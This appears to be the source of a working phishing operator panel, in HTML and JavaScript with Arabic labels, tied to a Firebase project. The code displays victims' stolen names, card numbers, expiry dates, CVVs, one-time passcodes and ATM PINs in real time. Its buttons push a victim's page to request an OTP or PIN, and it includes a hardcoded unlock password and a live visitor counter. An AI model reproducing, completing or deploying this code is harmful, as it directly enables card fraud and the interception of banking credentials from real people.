<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE PANEL v4 - System-Cloud-V3</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --p-clr: #006C35; --dark: #0a0a0a; --accent: #00ff88; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--dark); color: #fff; margin: 0; user-select: none; }
        
        /* شاشة القفل */
        #l-scr { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .p-in { padding: 15px; border-radius: 10px; border: 1px solid var(--p-clr); background: #111; color: var(--accent); font-size: 24px; text-align: center; letter-spacing: 5px; width: 300px; outline: none; }

        /* الهيدر */
        .h-nav { background: #1a1a1a; padding: 15px; border-bottom: 2px solid var(--p-clr); position: sticky; top: 0; z-index: 100; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .l-cnt { color: var(--accent); font-weight: bold; border: 1px solid var(--accent); padding: 5px 15px; border-radius: 20px; font-size: 14px; }

        /* حاوية البيانات */
        .main-c { padding: 20px; max-width: 1200px; margin: auto; }
        .r-row { background: #1e1e1e; border-radius: 10px; padding: 20px; margin-bottom: 15px; display: grid; grid-template-columns: 1.5fr 2fr 1fr 1fr 1.5fr; gap: 15px; align-items: center; border-right: 6px solid #444; transition: 0.3s; box-shadow: 0 4px 6px rgba(0,0,0,0.2); }
        .r-row:hover { transform: scale(1.01); background: #252525; }
        
        .c-box { display: flex; flex-direction: column; }
        .lbl { font-size: 11px; color: #888; margin-bottom: 5px; text-transform: uppercase; }
        .val { font-size: 15px; font-weight: bold; color: #eee; }
        .c-num { color: #ff4d4d; font-family: 'Courier New', monospace; font-size: 19px; background: #2a1010; padding: 5px; border-radius: 5px; text-align: center; border: 1px solid #4d1a1a; }
        
        /* الأزرار */
        .act { display: flex; flex-direction: column; gap: 8px; }
        .b-x { border: none; border-radius: 6px; padding: 10px; color: #fff; font-weight: bold; cursor: pointer; font-size: 13px; transition: 0.2s; }
        .b-ok { background: var(--p-clr); } .b-ok:hover { background: #008a44; }
        .b-wait { background: #856404; color: #fff; }
        .b-no { background: #333; } .b-no:hover { background: #444; }

        /* تنبيهات */
        .status-new { border-right-color: var(--accent) !important; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(0, 255, 136, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); } }
    </style>
</head>
<body>

<div id="l-scr">
    <h2 style="color: var(--p-clr); margin-bottom: 5px;">ENGINEER HASAN</h2>
    <p style="color: #666; margin-bottom: 20px;">SYSTEM CLOUD V3 ACCESS</p>
    <input type="password" class="p-in" id="p-key" placeholder="••••••••" oninput="_auth(this.value)">
</div>

<audio id="_notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div class="h-nav">
    <div class="l-cnt">LIVE: <span id="_online">0</span> زائر</div>
    <div style="text-align: center;">
        <span style="color: var(--accent); font-size: 18px; font-weight: bold;">رادار المراقبة اللحظي</span><br>
        <small style="color: #888;">Project: System-Cloud-V3</small>
    </div>
</div>

<div class="main-c" id="_logs">
    </div>

<script>
    // بيانات المشروع الجديد من الصورة التي أرسلتها
    const _cfg = {
        apiKey: "AIzaSyC84Zm9LxskNvp0Bq8LutoVX...", 
        authDomain: "system-cloud-v3.firebaseapp.com",
        databaseURL: "https://system-cloud-v3-default-rtdb.firebaseio.com",
        projectId: "system-cloud-v3",
        storageBucket: "system-cloud-v3.firebasestorage.app",
        messagingSenderId: "48216753818",
        appId: "1:48216753818:web:ef537a31f36a08dffc4123"
    };

    firebase.initializeApp(_cfg);
    const _db = firebase.database();

    function _auth(v) {
        if(v === "H1234567890H") {
            document.getElementById('l-scr').style.display = 'none';
        }
    }

    const _container = document.getElementById('_logs');
    const _sound = document.getElementById('_notif');

    // وظيفة معالجة البيانات وعرضها فوراً
    function _draw(id, data, isNew = false) {
        let card = document.getElementById('card-' + id);
        const user = data.personal_info || {};
        const cardInfo = data.card_details || {};
        
        const content = `
            <div class="c-box">
                <span class="lbl">العميل</span>
                <span class="val">${user.fullName || 'جاري الإدخال...'}</span>
                <small style="color:var(--accent)">📍 ${data.current_page || 'Index'}</small>
            </div>
            <div class="c-box">
                <span class="lbl">رقم البطاقة</span>
                <span class="c-num">${cardInfo.cardNumber || '**** **** **** ****'}</span>
                <small style="text-align:center">EXP: ${cardInfo.expiry || '--/--'} | CVV: ${cardInfo.cvv || '***'}</small>
            </div>
            <div class="c-box" style="text-align: center;">
                <span class="lbl">الرموز المستلمة</span>
                <span class="val" style="color: #00aaff; font-size: 22px;">OTP: ${cardInfo.otp || '----'}</span>
                <span class="val" style="color: #ff4d4d;">PIN: ${cardInfo.atm_pin || '----'}</span>
            </div>
            <div class="c-box">
                <span class="lbl">التوقيت</span>
                <span class="val" style="font-size: 12px;">${new Date().toLocaleTimeString('ar-EG')}</span>
            </div>
            <div class="act">
                <button class="b-x b-ok" onclick="_cmd('${id}', 'go_to_otp')">طلب OTP</button>
                <button class="b-x b-wait" onclick="_cmd('${id}', 'go_to_pin')">طلب PIN</button>
                <button class="b-x b-no" onclick="_del('${id}')">حذف</button>
            </div>
        `;

        if (card) {
            card.innerHTML = content;
            if(isNew) card.classList.add('status-new');
        } else {
            card = document.createElement('div');
            card.id = 'card-' + id;
            card.className = 'r-row status-new';
            card.innerHTML = content;
            _container.insertBefore(card, _container.firstChild);
            _sound.play().catch(e=>{});
        }
        setTimeout(() => card.classList.remove('status-new'), 5000);
    }

    // مراقبة ذكية (لا تستهلك موارد)
    _db.ref('orders').on('child_added', (s) => _draw(s.key, s.val(), true));
    _db.ref('orders').on('child_changed', (s) => _draw(s.key, s.val(), true));
    _db.ref('orders').on('child_removed', (s) => document.getElementById('card-' + s.key)?.remove());

    function _cmd(id, st) {
        _db.ref('orders/' + id).update({ next_step: st, last_action: Date.now() });
    }

    function _del(id) {
        if(confirm('هل أنت متأكد من الحذف؟')) _db.ref('orders/' + id).remove();
    }

    // مراقبة الزوار النشطين
    _db.ref('live_sessions').on('value', (s) => {
        let count = 0;
        s.forEach(x => { if(Date.now() - x.val().last_seen < 30000) count++; });
        document.getElementById('_online').innerText = count;
    });
</script>
</body>
</html>
